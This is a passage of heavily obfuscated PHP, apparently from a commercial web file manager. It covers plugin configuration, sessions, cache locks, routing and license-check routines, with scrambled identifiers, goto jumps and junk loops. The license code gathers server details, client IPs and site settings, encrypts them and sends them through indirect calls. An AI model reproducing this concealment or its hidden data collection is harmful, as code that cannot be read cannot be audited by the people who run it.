$Î§úšñ‚ =& $_SERVER[Î·Ü›öğ]; $æ”áÓƒ¨ = array(); $©“·â” = $this->loadList($ÓğÅàÅ); if ($©“·â” && is_array($©“·â”[$Î§úšñ‚[6]])) { $æ”áÓƒ¨ = $©“·â”[$Î§úšñ‚[6]]; } if (!$æ”áÓƒ¨ || $˜Å¿µÚ‰) { $æ”áÓƒ¨ = $this->getConfigDefault($ÓğÅàÅ); } return $æ”áÓƒ¨; } public function setConfig($Ü¦ªè•á, $˜Šå˜— = false) { $õŞúüÁ£ =& $_SERVER[Î·Ü›öğ]; $Á‡ÏšÍŞ = $this->loadList($Ü¦ªè•á); if (!$Á‡ÏšÍŞ) { return !1; } $‚ê…Ìóü = $Á‡ÏšÍŞ[$õŞúüÁ£[6]]; if ($˜Šå˜— == !1) { $‚ê…Ìóü = array(); $˜Šå˜— = $this->getConfigDefault($Ü¦ªè•á); } foreach ($˜Šå˜— as $ü©©ø‰¹ => $€ïîøï©) { $‚ê…Ìóü[$ü©©ø‰¹] = is_string($€ïîøï©) ? trim($€ïîøï©) : $€ïîøï©; } $this->update($Á‡ÏšÍŞ[$õŞúüÁ£[477]], array($õŞúüÁ£[6] => $‚ê…Ìóü)); } public function viewList() { $»“Â·ŒÜ =& $_SERVER[Î·Ü›öğ]; $¤®Ë„ = $this->loadList(); $this->pluginScan($¤®Ë„); $¤®Ë„ = $this->loadPluginList(); $ú¨Şì¨ = array(); foreach ($¤®Ë„ as $ÔéÔÄ‡ => $ìµæı…–) { $‚È£Ñì = $ìµæı…–; unset($ìµæı…–[$»“Â·ŒÜ[2134]], $ìµæı…–[$»“Â·ŒÜ[6]]); $õˆÍ ÇÛ = PLUGIN_DIR . $ìµæı…–[$»“Â·ŒÜ[32]] . $»“Â·ŒÜ[2136]; if (!is_file($õˆÍ ÇÛ)) { continue; } $³½‘€İ‹ = Hook::apply($ìµæı…–[$»“Â·ŒÜ[32]] . $»“Â·ŒÜ[2144]); if (!is_array($³½‘€İ‹)) { continue; } $ú¨Şì¨[$ÔéÔÄ‡] = array_merge($ìµæı…–, $³½‘€İ‹); if ($‚È£Ñì[$»“Â·ŒÜ[6]][$»“Â·ŒÜ[1721]] != $³½‘€İ‹[$»“Â·ŒÜ[1695]]) { Hook::apply($ìµæı…–[$»“Â·ŒÜ[32]] . $»“Â·ŒÜ[2141]); $‚È£Ñì[$»“Â·ŒÜ[6]][$»“Â·ŒÜ[1721]] = $³½‘€İ‹[$»“Â·ŒÜ[1695]]; $this->update($ìµæı…–[$»“Â·ŒÜ[477]], array($»“Â·ŒÜ[6] => $‚È£Ñì[$»“Â·ŒÜ[6]])); } } return $ú¨Şì¨; } private function loadPluginList() { $ßÕŠ®ßî =& $_SERVER[Î·Ü›öğ]; $û”®– = $this->loadList(); if (strtolower(MOD) == $ßÕŠ®ßî[2145]) { return $û”®–; } $ÙµûŸ¯ = Hook::trigger($ßÕŠ®ßî[2146], $û”®–); if ($û”®– && !$ÙµûŸ¯) { die; } return $ÙµûŸ¯ ? $ÙµûŸ¯ : $û”®–; } private function pluginScan($À²ÔïàÀ) { $‹ö¬û–ş =& $_SERVER[Î·Ü›öğ]; recursion_dir(PLUGIN_DIR, $Ó÷Æ›Ø, $£˜úç¬, 0); foreach ($Ó÷Æ›Ø as $’­ÇÎ¡²) { $ã§„İ— = get_path_this($’­ÇÎ¡²); if (isset($À²ÔïàÀ[$ã§„İ—]) || !file_exists($’­ÇÎ¡² . $‹ö¬û–ş[2147]) || !file_exists($’­ÇÎ¡² . $‹ö¬û–ş[2136])) { continue; } Hook::apply($ã§„İ— . $‹ö¬û–ş[2141]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\x6d\137\x73\145\x73\163\x69\x6f\x6e"; public function get($ãÙúİÏå) { $îÊøµµ¤ =& $_SERVER[Î·Ü›öğ]; $£ü¶ù“« = $this->where(array($îÊøµµ¤[2148] => $ãÙúİÏå))->find(); if (!is_array($£ü¶ù“«)) { return !1; } return $£ü¶ù“«[$îÊøµµ¤[171]]; } public function set($±™­ç, $ÌÇô» ú, $ ÇïŞÚ = 3600) { $©•Îİû =& $_SERVER[Î·Ü›öğ]; $ú”Û’ = array($©•Îİû[2148] => $±™­ç, $©•Îİû[2049] => $ÌÇô» ú, $©•Îİû[2149] => $ ÇïŞÚ + time()); if (Session::get($©•Îİû[2150])) { $ú”Û’[$©•Îİû[1810]] = Session::get($©•Îİû[2150]); } else { $ú”Û’[$©•Îİû[1810]] = 0; } if ($this->get($±™­ç)) { return $this->where(array($©•Îİû[2148] => $±™­ç))->save($ú”Û’); } else { return $this->add($ú”Û’, array(), !0); } } public function remove($ñ£ÒªÔË) { return $this->where(array($_SERVER[Î·Ü›öğ][2148] => $ñ£ÒªÔË))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Î·Ü›öğ][2151] . time())->delete(); } } goto FÖ·³ÓóŒ¡; bİ Ìà¶Š˜: class CacheLockMemcached { public function lock($¼…¬ú…«, $£¿¹šµÒ = 0) { $†çÚ’Ş‘ = Cache::init(); $äô»«Œ‚ = microtime(!0) + $£¿¹šµÒ; while (microtime(!0) < $äô»«Œ‚) { $€Ò”Å„õ = $†çÚ’Ş‘->get($¼…¬ú…«); if (!$€Ò”Å„õ || $€Ò”Å„õ < microtime(!0)) { $Ô·ÔË¢ = $†çÚ’Ş‘->handle->add($¼…¬ú…«, $äô»«Œ‚, $£¿¹šµÒ); if ($Ô·ÔË¢) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($œÕæÁÏô) { return Cache::init()->get($œÕæÁÏô); } public function unlock($ıå»Å‡) { return Cache::init()->remove($ıå»Å‡); } } class CacheLockDatabase { public function lock($çÑø–Œî, $ïı½Áú¦ = 0) { $öûƒşÂŒ = Model($_SERVER[Î·Ü›öğ][926]); $”•Äşˆì = microtime(!0) + $ïı½Áú¦; while (microtime(!0) < $”•Äşˆì) { $ê®‡±û = $öûƒşÂŒ->get($çÑø–Œî); if (!$ê®‡±û || $ê®‡±û < microtime(!0)) { $©â»Ğ·Ö = $öûƒşÂŒ->set($çÑø–Œî, $”•Äşˆì); if ($©â»Ğ·Ö) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¶€Ê¾ŒÉ) { return Model($_SERVER[Î·Ü›öğ][926])->get($¶€Ê¾ŒÉ); } public function unlock($ãÈŒ¼Ñƒ) { Model($_SERVER[Î·Ü›öğ][926])->remove($ãÈŒ¼Ñƒ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($–üàÈÕ, $Ìîº»Ÿ¬) { $’ÃùÄÈ¶ =& $_SERVER[Î·Ü›öğ]; if (!class_exists($’ÃùÄÈ¶[967])) { show_json($’ÃùÄÈ¶[968], !1); } $this->cacheTime = $Ìîº»Ÿ¬; $this->handle = new Memcached(); if (is_array($–üàÈÕ[$’ÃùÄÈ¶[969]]) && count($–üàÈÕ[$’ÃùÄÈ¶[969]]) >= 1) { foreach ($–üàÈÕ[$’ÃùÄÈ¶[969]] as $¡çõß²Ò) { $ê½•¶ñ¶ = explode($’ÃùÄÈ¶[4], $¡çõß²Ò); $this->handle->addServer($ê½•¶ñ¶[0], $ê½•¶ñ¶[1]); } } else { $this->handle->addServer($–üàÈÕ[$’ÃùÄÈ¶[209]], $–üàÈÕ[$’ÃùÄÈ¶[210]]); } } public function set($¹Ö©ÅİÈ, $úëá Ûœ, $ŞĞú†ä¥ = false) { $ŞĞú†ä¥ = $ŞĞú†ä¥ ? $ŞĞú†ä¥ : $this->cacheTime; return $this->handle->set($¹Ö©ÅİÈ, $úëá Ûœ, $ŞĞú†ä¥); } public function get($ÏëèÒº­) { return $this->handle->get($ÏëèÒº­); } public function remove($¯Í—â‹ğ) { return $this->handle->delete($¯Í—â‹ğ); } public function deleteAll() { return $this->handle->flush(); } } goto f˜ˆ¦ë‘™; döÄÒ•²Á‡: if (!$zfvktopyjc) { die; } class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\151\x6e\144\145\x78"; function __construct() { } public function setDefault($ƒÚé­Ÿ) { $İ–¬ªç =& $_SERVER[Î·Ü›öğ]; $´«ŸóûÆ =& $_SERVER[Ò¼î¯­]; $ãÆä­³ = explode($´«ŸóûÆ[0], trim($ƒÚé­Ÿ, $´«ŸóûÆ[0])); $this->defaultModule = $ãÆä­³[0] ? $ãÆä­³[0] : $this->defaultModule; $„Çéôõ = $İ–¬ªç[699]; if (strlen($„Çéôõ) < $İ–¬ªç[700]) { die; } $this->defaultController = $ãÆä­³[1] ? $ãÆä­³[1] : $this->defaultController; $ïé™˜¶’ = $İ–¬ªç[701]; if (strlen($ïé™˜¶’) < $İ–¬ªç[702]) { die; } $this->defaultAction = $ãÆä­³[2] ? $ãÆä­³[2] : $this->defaultAction; $Û£óøé = $İ–¬ªç[703]; if (strlen($Û£óøé) < $İ–¬ªç[700]) { die; } $this->hpjs51d21309($´«ŸóûÆ[1], array($this, $´«ŸóûÆ[2])); $„ü“¹ = $İ–¬ªç[704]; } public function appRun($È«úñ×ò) { $Âß¨ˆ‰¨ =& $_SERVER[Î·Ü›öğ]; $Èş‚ÔĞœ =& $_SERVER[Ò¼î¯­]; $¢Û¯ğ = explode($Èş‚ÔĞœ[0], $È«úñ×ò); $÷è‡ÚÜ = $Âß¨ˆ‰¨[705]; if (!$÷è‡ÚÜ) { return; } $ıä‡Äú¬ = strtolower($¢Û¯ğ[0]); $É¹ë”ş– = $Âß¨ˆ‰¨[706]; if (strlen($É¹ë”ş–) < $Âß¨ˆ‰¨[702]) { return; } $ÂŒš³¹ = $Èş‚ÔĞœ[3]; $Ïğ§¬Šê = $Âß¨ˆ‰¨[707]; while ($Ïğ§¬Šê < $Âß¨ˆ‰¨[485]) { if ($Ïğ§¬Šê >= 0) { break; } $Ïğ§¬Šê++; } if ($ıä‡Äú¬ == $Èş‚ÔĞœ[4]) { $ÂŒš³¹ = $Èş‚ÔĞœ[5]; $¢Û¯ğ[0] = $Èş‚ÔĞœ[6]; $¢Û¯ğ[1] = $¢Û¯ğ[1] . $Èş‚ÔĞœ[7]; $È«úñ×ò = join($Èş‚ÔĞœ[0], $¢Û¯ğ); $È«úñ×ò = trim($È«úñ×ò, $Èş‚ÔĞœ[0]); } call_user_func(array($Èş‚ÔĞœ[8], $Èş‚ÔĞœ[9]), $ÂŒš³¹ . $Èş‚ÔĞœ[10], $È«úñ×ò); ActionCall($È«úñ×ò); $è¾˜Ã‡ = $Âß¨ˆ‰¨[708]; while (strlen($è¾˜Ã‡) < $Âß¨ˆ‰¨[709]) { if (!$è¾˜Ã‡) { break; } $è¾˜Ã‡++; } call_user_func(array($Èş‚ÔĞœ[8], $Èş‚ÔĞœ[9]), $ÂŒš³¹ . $Èş‚ÔĞœ[11], $È«úñ×ò); $±ÒÆÕû = $Âß¨ˆ‰¨[710]; if (strlen($±ÒÆÕû) < $Âß¨ˆ‰¨[711]) { return; } } private function autorun() { $Ï³”œ—è =& $_SERVER[Î·Ü›öğ]; $Ó·¿£÷õ =& $_SERVER[Ò¼î¯­]; global $config; $ûİ¿µ”é = $Ï³”œ—è[712]; if (count($config[$Ó·¿£÷õ[12]]) == 0) { return; } foreach ($config[$Ó·¿£÷õ[12]] as $ø¿†µ‘ï => $¯‰«íÏ) { $this->appRun($¯‰«íÏ); $ëµæ¸ì£ = $Ï³”œ—è[713]; if (strlen($ëµæ¸ì£) < $Ï³”œ—è[709]) { die; } } } private function rdgoadf88d4e() { $÷Œ»‡³ =& $_SERVER[Î·Ü›öğ]; $åš·ÎŞù =& $_SERVER[Ò¼î¯­]; $¨¯ùñ™° = $åš·ÎŞù[4]; $èëÍÏÔ = $GLOBALS[$åš·ÎŞù[13]][$åš·ÎŞù[14]][0]; $’—ƒ¾Ì× = $÷Œ»‡³[714]; if (!$’—ƒ¾Ì×) { return; } if (!$èëÍÏÔ || strlen($èëÍÏÔ) <= strlen($¨¯ùñ™°)) { return; } if (strtolower(substr($èëÍÏÔ, -strlen($¨¯ùñ™°))) != $¨¯ùñ™°) { return; } $™ñ¡…õº = substr($èëÍÏÔ, 0, -strlen($¨¯ùñ™°)); $·–şß‹ñ = $÷Œ»‡³[715]; if (!$·–şß‹ñ) { return; } $°Ú÷ü†ô = array($åš·ÎŞù[4], $™ñ¡…õº); $ËŞ¥‘Â = $÷Œ»‡³[716]; if (strlen($ËŞ¥‘Â) < $÷Œ»‡³[700]) { return; } $ÆèÕÇÚ = array_slice($GLOBALS[$åš·ÎŞù[13]][$åš·ÎŞù[14]], 1); $GLOBALS[$åš·ÎŞù[13]][$åš·ÎŞù[14]] = array_merge($°Ú÷ü†ô, $ÆèÕÇÚ); $GLOBALS[$åš·ÎŞù[13]][$åš·ÎŞù[15]] = implode($åš·ÎŞù[0], $GLOBALS[$åš·ÎŞù[13]][$åš·ÎŞù[14]]); } private function lesge9793744() { $“®œÙì¶ =& $_SERVER[Î·Ü›öğ]; $—½Å®´å =& $_SERVER[Ò¼î¯­]; if ($GLOBALS[$—½Å®´å[13]][$—½Å®´å[15]] != $—½Å®´å[6]) { return; } $çéµ“³ = $_SERVER[$—½Å®´å[16]]; $ë²ŠÊ© = $—½Å®´å[17]; $À¯ïİÛ€ = $“®œÙì¶[717]; if (!strstr($çéµ“³, $ë²ŠÊ©)) { return; } $¼‡¼€¶¼ = strrpos($çéµ“³, $ë²ŠÊ©); $ÔÕ—äÑ‡ = $“®œÙì¶[718]; if (!$ÔÕ—äÑ‡) { return; } $™¥ŸŸ­— = substr($çéµ“³, $¼‡¼€¶¼ + strlen($ë²ŠÊ©)); $’ÇğØ = $“®œÙì¶[719]; preg_match_all($—½Å®´å[18], $™¥ŸŸ­—, $¹äÈ‹ä©); $™¥ŸŸ­— = trim($¹äÈ‹ä©[0][0], $—½Å®´å[19]); $Ç¾ëŞ­Ù = $“®œÙì¶[720]; $GLOBALS[$—½Å®´å[13]][$—½Å®´å[14]] = explode($—½Å®´å[19], $™¥ŸŸ­—); $GLOBALS[$—½Å®´å[13]][$—½Å®´å[15]] = implode($—½Å®´å[0], $GLOBALS[$—½Å®´å[13]][$—½Å®´å[14]]); } public function run() { $àË ˆğÍ =& $_SERVER[Î·Ü›öğ]; $õÚÓ»ô› =& $_SERVER[Ò¼î¯­]; $this->lesge9793744(); $this->rdgoadf88d4e(); $Œ™“Íç = $GLOBALS[$õÚÓ»ô›[13]][$õÚÓ»ô›[14]]; $˜ƒ„Òí = $àË ˆğÍ[721]; $²ÀÁÌé¼ = $GLOBALS[$õÚÓ»ô›[13]][$õÚÓ»ô›[15]]; define($õÚÓ»ô›[20], isset($Œ™“Íç[0]) && $Œ™“Íç[0] ? $Œ™“Íç[0] : $this->defaultModule); $öÍ¡µ¾Õ = $àË ˆğÍ[722]; if (!$öÍ¡µ¾Õ) { return; } define($õÚÓ»ô›[21], isset($Œ™“Íç[1]) && $Œ™“Íç[0] ? $Œ™“Íç[1] : $this->defaultController); define($õÚÓ»ô›[22], isset($Œ™“Íç[2]) && $Œ™“Íç[0] ? $Œ™“Íç[2] : $this->defaultAction); define($õÚÓ»ô›[23], MOD . $õÚÓ»ô›[0] . ST . $õÚÓ»ô›[0] . ACT); $ëÅª†™ = $àË ˆğÍ[723]; if (strlen($ëÅª†™) < $àË ˆğÍ[700]) { die; } $_SERVER[$õÚÓ»ô›[24]] = strtolower(ACTION); $this->autorun(); $›ÇÔìŠÀ = $àË ˆğÍ[724]; if (strlen($›ÇÔìŠÀ) < $àË ˆğÍ[702]) { die; } if (count($Œ™“Íç) >= 3) { $this->appRun($²ÀÁÌé¼); } else { $this->appRun(ACTION); } } private $vqlo8c031671 = array(); private $jzarfbeb2873 = ''; public function iqrocf8d478f() { $Úçõ¤»Ï =& $_SERVER[Î·Ü›öğ]; $çìš™  =& $_SERVER[Ò¼î¯­]; $this->uomgb5ce4724(); $this->yokb8555e6f9(); $this->gbmkc9a76b40(); $øàÓı›Á = $Úçõ¤»Ï[725]; while ($øàÓı›Á < $Úçõ¤»Ï[711]) { if ($øàÓı›Á >= 0) { break; } $øàÓı›Á++; } $this->ykdw3e842ebe(); $Ô˜¡¥˜„ = $Úçõ¤»Ï[726]; if (strlen($Ô˜¡¥˜„) < $Úçõ¤»Ï[700]) { return; } $this->vygc9df0fa16(); $Ñœ†–²¥ = $Úçõ¤»Ï[727]; while (strlen($Ñœ†–²¥) < $Úçõ¤»Ï[700]) { if (!$Ñœ†–²¥) { break; } $Ñœ†–²¥++; } $this->latf9cfab43c(); $ŠÂàÓ¯” = $Úçõ¤»Ï[728]; if (strlen($ŠÂàÓ¯”) < $Úçõ¤»Ï[702]) { return; } $this->ewbh36422895(); $èòµÛ¥ = $Úçõ¤»Ï[729]; while (strlen($èòµÛ¥) < $Úçõ¤»Ï[709]) { if (!$èòµÛ¥) { break; } $èòµÛ¥++; } $this->hpjs51d21309($çìš™ [25], array($this, $çìš™ [26])); $‹œƒôÜé = $Úçõ¤»Ï[730]; $this->hpjs51d21309($çìš™ [27], array($this, $çìš™ [28])); $this->hpjs51d21309($çìš™ [29], array($this, $çìš™ [30])); $this->hpjs51d21309($çìš™ [31], array($this, $çìš™ [32])); $”İ™ûê« = $Úçõ¤»Ï[731]; while (strlen($”İ™ûê«) < $Úçõ¤»Ï[709]) { if (!$”İ™ûê«) { break; } $”İ™ûê«++; } } public function bsvx6d05e29c($áÅûÄ—ı) { $ó•±¦×Ü =& $_SERVER[Î·Ü›öğ]; $úü¶ÁÔª =& $_SERVER[Ò¼î¯­]; $‚¼×²° = Model($úü¶ÁÔª[33])->get(); $ÛÁÑ©º• = array($úü¶ÁÔª[34], $úü¶ÁÔª[35], $úü¶ÁÔª[36], $úü¶ÁÔª[37], $úü¶ÁÔª[38], $úü¶ÁÔª[39], $úü¶ÁÔª[40], $úü¶ÁÔª[41], $úü¶ÁÔª[42], $úü¶ÁÔª[43], $úü¶ÁÔª[44], $úü¶ÁÔª[45], $úü¶ÁÔª[46], $úü¶ÁÔª[47], $úü¶ÁÔª[48], $úü¶ÁÔª[49], $úü¶ÁÔª[50], $úü¶ÁÔª[51], $úü¶ÁÔª[52], $úü¶ÁÔª[53], $úü¶ÁÔª[54], $úü¶ÁÔª[55], $úü¶ÁÔª[56], $úü¶ÁÔª[57], $úü¶ÁÔª[58], $úü¶ÁÔª[59], $úü¶ÁÔª[60], $úü¶ÁÔª[61], $úü¶ÁÔª[62], $úü¶ÁÔª[63], $úü¶ÁÔª[64], $úü¶ÁÔª[65], $úü¶ÁÔª[66], $úü¶ÁÔª[67], $úü¶ÁÔª[68], $úü¶ÁÔª[69], $úü¶ÁÔª[70], $úü¶ÁÔª[71], $úü¶ÁÔª[72], $úü¶ÁÔª[73], $úü¶ÁÔª[74], $úü¶ÁÔª[75], $úü¶ÁÔª[76], $úü¶ÁÔª[77], $úü¶ÁÔª[78], $úü¶ÁÔª[79], $úü¶ÁÔª[80], $úü¶ÁÔª[81], $úü¶ÁÔª[82], $úü¶ÁÔª[83], $úü¶ÁÔª[84], $úü¶ÁÔª[85]); $Èƒ«ÎÌ = $ó•±¦×Ü[732]; foreach ($ÛÁÑ©º• as $‡ ‹ÛåÒ) { $ø©¹øŸÔ = $GLOBALS[$úü¶ÁÔª[86]][$úü¶ÁÔª[87]][$‡ ‹ÛåÒ]; if (isset($‚¼×²°[$‡ ‹ÛåÒ])) { $ø©¹øŸÔ = $‚¼×²°[$‡ ‹ÛåÒ]; } $áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[89]][$‡ ‹ÛåÒ] = $ø©¹øŸÔ; } $şŒ½“£ğ = $áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[89]][$úü¶ÁÔª[46]]; unset($áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[90]][$úü¶ÁÔª[91]]); $ªÛº£¤½ = $ó•±¦×Ü[733]; unset($áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[90]][$úü¶ÁÔª[92]]); $æìˆ‡ = $ó•±¦×Ü[734]; if (strlen($æìˆ‡) < $ó•±¦×Ü[709]) { return; } unset($áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[89]][$úü¶ÁÔª[46]]); unset($áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[89]][$úü¶ÁÔª[93]]); $áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[89]][$úü¶ÁÔª[94]] = array($úü¶ÁÔª[95] => (int) $şŒ½“£ğ[$úü¶ÁÔª[96]], $úü¶ÁÔª[97] => (int) _get($şŒ½“£ğ, $úü¶ÁÔª[98], 0)); $›ÑÇşã = substr(md5($úü¶ÁÔª[99] . get_client_ip() . $‚¼×²°[$úü¶ÁÔª[100]]), 0, 15); $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[102]] = Mcrypt::encode(Session::sign(), $›ÑÇşã, 3600 * 24); $ú¼åì¶§ = $ó•±¦×Ü[735]; $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[103]] = Action($úü¶ÁÔª[104])->accessToken(); $‡ñ±ÅÔ = $ó•±¦×Ü[736]; while (strlen($‡ñ±ÅÔ) < $ó•±¦×Ü[485]) { if (!$‡ñ±ÅÔ) { break; } $‡ñ±ÅÔ++; } $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[105]] = md5($_SERVER[$úü¶ÁÔª[106]] . $‚¼×²°[$úü¶ÁÔª[100]]); $¿’şƒªõ = $ó•±¦×Ü[737]; while ($¿’şƒªõ < $ó•±¦×Ü[711]) { if ($¿’şƒªõ >= 0) { break; } $¿’şƒªõ++; } $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[107]] = base64_encode(serverInfo()); $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[108]] = $this->jzarfbeb2873; $¥ÒàÏ¤³ = $ó•±¦×Ü[738]; if (!$¥ÒàÏ¤³) { return; } if ($‚¼×²°[$úü¶ÁÔª[108]] != $úü¶ÁÔª[109]) { $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[110]] = $‚¼×²°[$úü¶ÁÔª[110]]; $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[111]] = $‚¼×²°[$úü¶ÁÔª[111]]; $øÜ—„´Š = rand_string(10) . $this->jzarfbeb2873 . rand_string(5); $áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[112]][$úü¶ÁÔª[113]] = $this->kzgs8fa9b962($øÜ—„´Š, $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[105]]); } if ($this->jzarfbeb2873 == $úü¶ÁÔª[109]) { $áÅûÄ—ı[$úü¶ÁÔª[88]][$úü¶ÁÔª[89]][$úü¶ÁÔª[94]][$úü¶ÁÔª[98]] = 0; } $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[114]] = $this->versionPluginFilter(); $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[115]] = _get($this->vqlo8c031671, $úü¶ÁÔª[116], $úü¶ÁÔª[6]); if (KodUser::isRoot() && $this->config[$úü¶ÁÔª[117]]) { $áÅûÄ—ı[$úü¶ÁÔª[101]][$úü¶ÁÔª[118]] = WEB_ROOT; } return $áÅûÄ—ı; } private function latf9cfab43c() { $ƒ‚íÇê =& $_SERVER[Î·Ü›öğ]; $ë‘›®¿˜ =& $_SERVER[Ò¼î¯­]; $áÄÆÅ = $_SERVER[$ë‘›®¿˜[24]] == $ë‘›®¿˜[119]; $š¯œ¹ = $ƒ‚íÇê[714]; if ($_SERVER[$ë‘›®¿˜[24]] == $ë‘›®¿˜[120] && $_GET[$ë‘›®¿˜[121]] == $ë‘›®¿˜[122]) { $áÄÆÅ = !0; } if ($áÄÆÅ) { $ó ¤»ÑÓ = array($ë‘›®¿˜[108] => $this->jzarfbeb2873, $ë‘›®¿˜[123] => $this->zonia8e86e78(), $ë‘›®¿˜[124] => Model($ë‘›®¿˜[125])->count()); if ($this->jzarfbeb2873 != $ë‘›®¿˜[109]) { $È¯áÚ°ˆ = _get($this->vqlo8c031671, $ë‘›®¿˜[126]); if ($È¯áÚ°ˆ) { $ó ¤»ÑÓ[$ë‘›®¿˜[127]] = $È¯áÚ°ˆ; $ó ¤»ÑÓ[$ë‘›®¿˜[128]] = strtotime(_get($this->vqlo8c031671, $ë‘›®¿˜[129])); $ó ¤»ÑÓ[$ë‘›®¿˜[130]] = _get($this->vqlo8c031671, $ë‘›®¿˜[116]); } $²¨…¼Ü¹ = Model($ë‘›®¿˜[33])->get($ë‘›®¿˜[131], $ë‘›®¿˜[6], !0); if (is_string($²¨…¼Ü¹) && substr($²¨…¼Ü¹, 0, 1) == $ë‘›®¿˜[132]) { $²¨…¼Ü¹ = json_decode_force($²¨…¼Ü¹); } if (is_array($²¨…¼Ü¹) && $²¨…¼Ü¹[$ë‘›®¿˜[133]] && strstr($²¨…¼Ü¹[$ë‘›®¿˜[133]], $ë‘›®¿˜[134])) { $§ç”²’‡ = explode($ë‘›®¿˜[134], $²¨…¼Ü¹[$ë‘›®¿˜[133]]); $ó ¤»ÑÓ[$ë‘›®¿˜[135]] = $§ç”²’‡[0]; } } $ó ¤»ÑÓ = $this->rlqddde9af47(json_encode($ó ¤»ÑÓ), md5($ë‘›®¿˜[136])); $Ë®Åı‹ = array($ë‘›®¿˜[137] => $ó ¤»ÑÓ); $×íéöŒ = $ƒ‚íÇê[739]; if (strlen($×íéöŒ) < $ƒ‚íÇê[709]) { die; } call_user_func(array($ë‘›®¿˜[138], $ë‘›®¿˜[139]), $Ë®Åı‹); } if ($this->jzarfbeb2873 == $ë‘›®¿˜[109]) { return; } $şä‡“éç = array($ë‘›®¿˜[140], $ë‘›®¿˜[141], $ë‘›®¿˜[142], $ë‘›®¿˜[143], $ë‘›®¿˜[144], $ë‘›®¿˜[145]); $ƒ¼’üúÖ = $ƒ‚íÇê[740]; if (strlen($ƒ¼’üúÖ) < $ƒ‚íÇê[700]) { return; } $…èİ«ú“ = Model($ë‘›®¿˜[33])->get(); $Ë®Åı‹ = array($ë‘›®¿˜[146] => $…èİ«ú“[$ë‘›®¿˜[34]], $ë‘›®¿˜[147] => $…èİ«ú“[$ë‘›®¿˜[35]], $ë‘›®¿˜[148] => $ë‘›®¿˜[6]); foreach ($şä‡“éç as $³…ƒµùã) { if (!isset($…èİ«ú“[$³…ƒµùã]) || !$…èİ«ú“[$³…ƒµùã]) { continue; } $Ë®Åı‹[$³…ƒµùã] = $…èİ«ú“[$³…ƒµùã]; $¤½¶ù = $ƒ‚íÇê[741]; if (!$¤½¶ù) { die; } } call_user_func(array($ë‘›®¿˜[138], $ë‘›®¿˜[139]), $Ë®Åı‹); $€´Ñ¢ó‰ = $ƒ‚íÇê[742]; } private function ykdw3e842ebe() { $¸Õ“Ë³î =& $_SERVER[Î·Ü›öğ]; $«òÛÊšı =& $_SERVER[Ò¼î¯­]; if ($_SERVER[$«òÛÊšı[24]] != $«òÛÊšı[149]) { return; } if (!KodUser::isRoot()) { die; } $¾ËÁèëŠ = $GLOBALS[$«òÛÊšı[13]]; if (isset($¾ËÁèëŠ[$«òÛÊšı[150]])) { $this->pmcxf787b37d(); die; } if (isset($¾ËÁèëŠ[$«òÛÊšı[151]]) && isset($¾ËÁèëŠ[$«òÛÊšı[151]]) == $«òÛÊšı[122]) { $¾ËÁèëŠ[$«òÛÊšı[152]] = Model($«òÛÊšı[33])->get($«òÛÊšı[153]); } if (!isset($¾ËÁèëŠ[$«òÛÊšı[152]]) || strlen($¾ËÁèëŠ[$«òÛÊšı[152]]) != 16) { show_json($«òÛÊšı[154] . $¾ËÁèëŠ[$«òÛÊšı[152]], !1); } $ÄãÊª¿³ = Model($«òÛÊšı[33])->get($«òÛÊšı[100]); $¬†ä±î÷ = md5($_SERVER[$«òÛÊšı[106]] . $ÄãÊª¿³); $Ï°ÑÊÆÚ = $¸Õ“Ë³î[743]; if (!$Ï°ÑÊÆÚ) { die; } $÷ñš…¶Ê = array($«òÛÊšı[152] => $¾ËÁèëŠ[$«òÛÊšı[152]], $«òÛÊšı[155] => rand_string(16), $«òÛÊšı[156] => $«òÛÊšı[136], $«òÛÊšı[157] => $«òÛÊšı[158], $«òÛÊšı[159] => $_SERVER[$«òÛÊšı[160]], $«òÛÊšı[161] => $_SERVER[$«òÛÊšı[162]], $«òÛÊšı[163] => $_SERVER[$«òÛÊšı[164]], $«òÛÊšı[105] => $¬†ä±î÷, $«òÛÊšı[165] => Model($«òÛÊšı[33])->get($«òÛÊšı[131])); if (isset($¾ËÁèëŠ[$«òÛÊšı[151]]) && isset($¾ËÁèëŠ[$«òÛÊšı[151]]) == $«òÛÊšı[122]) { $÷ñš…¶Ê[$«òÛÊšı[151]] = md5($÷ñš…¶Ê[$«òÛÊšı[152]] . $«òÛÊšı[166] . $÷ñš…¶Ê[$«òÛÊšı[155]]); } if ($¾ËÁèëŠ[$«òÛÊšı[167]] == $«òÛÊšı[168]) { $ÓõŒ¼ŞÚ = $this->rlqddde9af47($¬†ä±î÷, $«òÛÊšı[169]); $É‘‡ÜØ‚ = $this->kzgs8fa9b962(json_encode($÷ñš…¶Ê), $¬†ä±î÷ . $«òÛÊšı[170], 3); $É‘‡ÜØ‚ = $É‘‡ÜØ‚ . $«òÛÊšı[171] . $_SERVER[$«òÛÊšı[160]]; $š¤çÔ½ = $this->xiwt141e00ce($«òÛÊšı[172] . $ÓõŒ¼ŞÚ . $«òÛÊšı[173] . $É‘‡ÜØ‚, -1); show_json($š¤çÔ½, 